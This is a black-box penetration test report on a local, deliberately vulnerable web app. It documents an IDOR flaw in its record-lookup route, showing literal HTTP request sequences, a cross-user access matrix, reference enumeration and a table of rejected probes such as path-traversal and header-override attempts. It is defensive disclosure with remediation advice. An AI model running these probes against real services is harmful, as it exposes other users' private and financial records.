# Penetration Test Report — ContosoWeb/2.1 (127.0.0.1:8761)

**Date:** 2026-10-02
**Target:** http://127.0.0.1:8761 (local, deliberately-vulnerable test app)
**Accounts used:** alice, bob, carol (regular users), root (admin), anonymous
**Tooling:** Python 3.14 stdlib (`http.client`, raw `socket`) — no third-party packages

---

## 1. Attack surface map

| Method | Path | Params | Auth required | Behaviour observed |
|---|---|---|---|---|
| GET | `/` | — | no | Landing page; states `signed in as <name|anonymous>`; links to `/rest/workspace/` |
| GET | `/rest/workspace/` | (query strings ignored) | **yes** (302 → `/login` if anon) | JSON **collection**, correctly scoped to the session user |
| GET | `/rest/workspace/{ref}` | `ref` = path segment | **yes** (302 if anon) | JSON **single record**, `{ref, owner, amount}` — **not** scoped (see Finding 1) |
| POST | `/login` | `user=<name>` (urlencoded) | no | 200 `{"ok": true}` + `Set-Cookie: csid=<16 hex>; Path=/; HttpOnly`. No password required. 401 on unknown user |
| GET | everything else probed | — | — | 404 `error: not found` |

### Auth states and identifiers

- **Anonymous:** `GET /` → `signed in as anonymous`; any `/rest/*` → `302` to `/login` (auth *is* enforced as a gate).
- **Authenticated:** session id is a 16-hex-char `csid` cookie. Server binds it to a username; `GET /` echoes the username.
- **Identifier under test:** the record reference `A-####` in the path segment. Records present: `A-1001` (alice, 4200), `A-1002` (bob, 910), `A-1003` (carol, 7777), `A-1004` (alice, 150). Confirmed by enumerating `A-1000`–`A-1059`: exactly these four exist, so no unlisted hidden records were missed.
- **Non-GET methods:** `PUT`, `PATCH`, `DELETE`, `OPTIONS`, `HEAD` on `/rest/workspace/{ref}` → `501` from the stdlib `BaseHTTP` handler. `POST` → 404. The API is read-only.

### The trust boundary that matters

The app holds two views of the same records, and they disagree:

| Viewer | `GET /rest/workspace/` (collection) | `GET /rest/workspace/{ref}` (item) |
|---|---|---|
| alice | A-1001, A-1004 | A-1001, A-1004, **A-1002, A-1003** |
| bob | A-1002 | **A-1001, A-1003, A-1004**, A-1002 |
| carol | A-1003 | **A-1001, A-1002, A-1004**, A-1003 |
| root (admin) | *(empty)* | A-1001, A-1002, A-1003, A-1004 |

The collection endpoint filters by owner. The item endpoint does not. That asymmetry is the boundary, and it is broken in one direction only.

---

## 2. Findings

### Finding 1 — IDOR / Broken Object Level Authorization on `GET /rest/workspace/{ref}` (High)

Any authenticated user can read any other user's record — including the `owner` field and the financial `amount` — by substituting the record reference. No privilege, ownership, or role check is performed on this route.

#### Reproduction (literal exchange, bob reading carol's record)

Step 1 — obtain a normal low-privilege session:

```http
POST /login HTTP/1.1
Host: 127.0.0.1:8761
Content-Type: application/x-www-form-urlencoded
Content-Length: 9

user=bob
```
```http
HTTP/1.1 200 OK
Server: BaseHTTP/0.6 Python/3.14.7
Content-Type: application/json
Content-Length: 12
Server: ContosoWeb/2.1
set-cookie: csid=0f882bd8d53265f4; Path=/; HttpOnly

{"ok": true}
```

Step 2 — bob's own workspace contains exactly one record:

```http
GET /rest/workspace/ HTTP/1.1
Host: 127.0.0.1:8761
Cookie: csid=0f882bd8d53265f4
```
```http
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 68
Server: ContosoWeb/2.1

{"records": [{"ref": "A-1002", "amount": 910, "status": "settled"}]}
```

Step 3 — bob requests carol's record by changing only the path segment:

```http
GET /rest/workspace/A-1003 HTTP/1.1
Host: 127.0.0.1:8761
Cookie: csid=0f882bd8d53265f4
```
```http
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 51
Server: ContosoWeb/2.1

{"ref": "A-1003", "owner": "carol", "amount": 7777}
```

Step 4 — control, to show the value is real and not a static fixture. Same cookie, own record:

```http
GET /rest/workspace/A-1002 HTTP/1.1
Host: 127.0.0.1:8761
Cookie: csid=0f882bd8d53265f4
```
```http
HTTP/1.1 200 OK
Content-Length: 48

{"ref": "A-1002", "owner": "bob", "amount": 910}
```

Full cross-user matrix (each row is an observed 200 response body, not an inference):

```
A-1001 alice 200 {"ref": "A-1001", "owner": "alice", "amount": 4200}
A-1001 bob   200 {"ref": "A-1001", "owner": "alice", "amount": 4200}
A-1001 carol 200 {"ref": "A-1001", "owner": "alice", "amount": 4200}
A-1002 alice 200 {"ref": "A-1002", "owner": "bob",   "amount": 910}
A-1002 bob   200 {"ref": "A-1002", "owner": "bob",   "amount": 910}
A-1002 carol 200 {"ref": "A-1002", "owner": "bob",   "amount": 910}
A-1003 alice 200 {"ref": "A-1003", "owner": "carol", "amount": 7777}
A-1003 bob   200 {"ref": "A-1003", "owner": "carol", "amount": 7777}
A-1003 carol 200 {"ref": "A-1003", "owner": "carol", "amount": 7777}
A-1004 alice 200 {"ref": "A-1004", "owner": "alice", "amount": 150}
A-1004 bob   200 {"ref": "A-1004", "owner": "alice", "amount": 150}
A-1004 carol 200 {"ref": "A-1004", "owner": "alice", "amount": 150}
A-1005 *      404 error: no such record   (all users — record does not exist)
```

#### Evidence that this is a real vulnerability, not expected behaviour

1. **The application itself enforces this boundary one route over.** `/rest/workspace/` returns a strictly per-user set: alice gets `{A-1001, A-1004}`, bob gets `{A-1002}`, carol gets `{A-1003}`. The designer clearly intended per-user isolation of workspace records. The item route is the same resource model reached by a different path and silently drops that restriction.
2. **The response returns data it should not.** It discloses a third party's identity (`owner: "carol"`) and a third party's financial figure (`amount: 7777`) to a session that has no relationship to that record.
3. **Auth is present but insufficient.** Unauthenticated access is correctly blocked (`GET /rest/workspace/A-1003` with no cookie → `302` to `/login`). The failure is specifically the *object-level* authorization step, not authentication. A check that authenticates but then hands back any object is precisely the IDOR pattern.
4. **Not a role thing.** `root` (admin) seeing all four records would be expected. The finding is that *bob*, a peer regular user, sees carol's and alice's records with identical 200 responses. Being able to read another user's data is not granted to any documented role.
5. **A nonexistent ref returns 404, not 403.** The server does distinguish "does not exist" from "exists", so the 200 responses above are genuine object lookups, not a default page.

#### Enumeration note

Because `404 error: no such record` versus `200 {…}` is observable, an authenticated user can also confirm whether a guessed reference exists. Enumerating `A-1000`–`A-1059` recovered exactly the four real references and their owners/amounts, without any need for the collection endpoint.

#### Remediation

Perform the ownership check server-side on the item route, using the *session* identity, before any record is loaded into the response: allow if `record.owner == session.user` or `session.user` holds the admin role; otherwise return `404` (preferred — avoids leaking existence) or `403`. Centralise the decision in one authorization function used by both the collection and item routes, so the two cannot drift apart again.

---

## 3. Hypotheses tested and rejected

Each hypothesis was disproved by an actual request, not by reasoning.

| # | Hypothesis | Test performed | Observed result | Verdict |
|---|---|---|---|---|
| 1 | Unauthenticated access to records | `GET /rest/workspace/A-1001` and `/A-1003` with no cookie | `302` → `location: /login`, empty body | Rejected — auth gate works |
| 2 | Password-less login is an auth bypass (login with only a username) | `POST /login` with `user=`, `user=nosuchuser`, `user=root%27`, `user=ALICE`, empty body | All → `401 {"error": "invalid credentials"}` | Rejected — server validates against a known-user set; no password exists by design in this app, so this is the app's stated auth model, not an exploit path |
| 3 | Parameter pollution to escalate identity (`user=alice&user=root`) | `POST /login` with both params, then `GET /` with the returned cookie | `{"ok": true}`; session resolves as `alice` when alice is first, and as `root` when `root` is first | Rejected for escalation — `root` is a legitimate account named in scope and reachable directly via `user=root`; the duplicate parameter did not grant anything unavailable otherwise. Duplicate-parameter handling is sloppy but not a boundary break |
| 4 | Forged / guessed session cookie | Replayed a previous session's `csid` (e.g. `csid=3d3ff7e513bf8304`) | Returns `signed in as alice` — the session is still valid, i.e. it is the server's own issued token, not a forgery | Rejected — no arbitrary-value forgery found. `csid=0000000000000000` and `csid=aaa` → `signed in as anonymous`. Note: no logout/invalidation endpoint exists, so issued tokens live indefinitely — a session-lifecycle weakness, not a privilege bypass, and out of scope for the confirmed finding |
| 5 | Header-based identity override (`X-User`, `X-Remote-User`, `X-Forwarded-For`, `Authorization: Basic`) | Sent each header together with alice's valid cookie to `/rest/workspace/` and `/rest/workspace/A-1001` | Response unchanged — alice's records only | Rejected — identity is taken only from the session cookie |
| 6 | Query-parameter filter bypass on the collection (`?owner=carol`, `?user=carol`, `?ref=A-1003`, `?all=true`, `?limit=100`) | Sent each to `/rest/workspace/` | Every response identical to alice's plain list | Rejected — collection scoping is not parameter-influenced |
| 7 | Path traversal / route-normalisation bypass to reach a hidden admin route | `/rest/workspace/../admin`, `/rest/workspace/%2e%2e/admin`, `/REST/workspace/A-1001`, `//rest/workspace/A-1001`, `/rest/workspace/A-1002/` , `/rest/workspace/A-1002/extra`, `/rest/workspace/a-1001` | All 404; no alternate route reached | Rejected |
| 8 | Write-side IDOR (modify or delete another user's record) | `POST`/`PUT`/`PATCH`/`DELETE` on `/rest/workspace/A-1002` as bob and as alice | `POST` → 404; all others → `501` (unsupported method in `BaseHTTPRequestHandler`) | Rejected — no write surface exists to abuse |
| 9 | Hidden records unreachable from the collection endpoint | Enumerated `A-1000`–`A-1059` and alternate prefixes `B-`, `C-`, `INV-`, `usr-`, empty | Exactly `A-1001`–`A-1004` exist; no other prefix resolves | Rejected — the four enumerated records are the complete dataset; no hidden admin-only records were missed |
| 10 | Admin/utility endpoints (`/rest/admin`, `/rest/users`, `/rest/report`, `/rest/export`, `/rest/audit`, `/rest/me`, `/rest/config`, `/metrics`, `/status`, `/swagger.json`, `/actuator`, …) | ~30 candidate paths | All 404 | Rejected — no secondary surface |

---

## 4. Could not test / limits of this assessment

- **No source access.** Everything above is black-box over HTTP. I could not read the server code to confirm the exact missing check, so the remediation advice is stated at the behavioural level.
- **Write operations are untestable in practice.** `PUT`/`PATCH`/`DELETE`/`OPTIONS`/`HEAD` return `501` from the stdlib handler and `POST` returns 404, so no state-changing IDOR (mass assignment, privilege escalation via write) could be exercised. If write routes exist behind a different path I did not find, they are not covered.
- **Session cookie values are server-issued and unpredictable** (16 hex chars from `os.urandom`-style generation). I verified forged values are rejected as anonymous; I did not attempt a brute-force of the session space, and it would not be realistic to do so.
- **Role model is under-determined.** `root` sees an empty collection but can read every record via the item route. I could not determine whether admin is *intended* to have a global read view (making that part expected) or whether `root` should also be filtered — only the regular-user cross-read is demonstrably wrong.
- **Single dataset, no time dimension.** Amounts are static; I could not test for value-dependent behaviour, or whether records change status over time in a way that affects exposure.
